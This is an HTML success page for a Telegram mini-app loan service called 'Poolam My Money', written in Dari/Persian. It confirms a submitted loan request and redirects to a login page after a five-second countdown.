<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>درخواست موفقانه - Poolam My Money</title>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f8fafc;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .success-card {
            background: white;
            width: 90%;
            max-width: 400px;
            padding: 40px 20px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(242,101,34,0.12);
        }

        .check-circle {
            width: 100px;
            height: 100px;
            background: linear-gradient(135deg, #f26522, #0072bc);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 30px;
            color: white;
            font-size: 50px;
        }

        h1 {
            color: #f26522;
            font-size: 24px;
            margin-bottom: 20px;
        }

        p {
            color: #4a5568;
            font-size: 15px;
            margin: 5px 0;
        }

        .timer-container {
            background-color: #fff8f5;
            border: 1px solid #fed7aa;
            border-radius: 12px;
            padding: 15px;
            margin: 30px 0;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            color: #f26522;
            font-weight: 500;
        }

        .loader-spinner {
            width: 18px;
            height: 18px;
            border: 2px solid #fed7aa;
            border-top: 2px solid #f26522;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .btn-home {
            background: #edf2f7;
            border: 1px solid #cbd5e0;
            color: #4a5568;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .top-toast {
            position: fixed;
            top: 20px;
            background: #1a202c;
            color: white;
            padding: 12px 20px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            direction: rtl;
        }
    </style>
</head>

<body>

<div class="top-toast">
    <span style="color:#f26522;">✔</span>
    <span>درخواست با موفقیت ارسال گردید!</span>
</div>

<div class="success-card">
    <div class="check-circle">✓</div>

    <h1>درخواست قرضه‌<br>موفقانه ثبت گردید</h1>

    <p>درخواست شما با موفقیت ثبت شد. لطفاً منتظر تأیید بمانید.</p>
    <p>به زودی با شما تماس گرفته خواهد شد.</p>

    <div class="timer-container">
        <div class="loader-spinner"></div>
        <span>
            انتقال به صفحه ورود Poolam My Money در 
            <span id="timer">5</span> ثانیه...
        </span>
    </div>

    <button type="button" class="btn-home" onclick="goToPage6()">
        همین حالا به صفحه ورود بروید
    </button>
</div>

<script>
    let timeLeft = 5;
    let interval;

    function updateTimer() {
        const el = document.getElementById('timer');
        if (el) el.textContent = timeLeft;
    }

    function goToPage6() {
        if (interval) clearInterval(interval);

        localStorage.removeItem('lastPin');
        
        window.location.href = "/page6";
    }

    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        updateTimer();

        interval = setInterval(() => {
            timeLeft--;

            if (timeLeft <= 0) {
                clearInterval(interval);
                goToPage6();
                return;
            }

            updateTimer();
        }, 1000);
    };
</script>

</body>
</html>
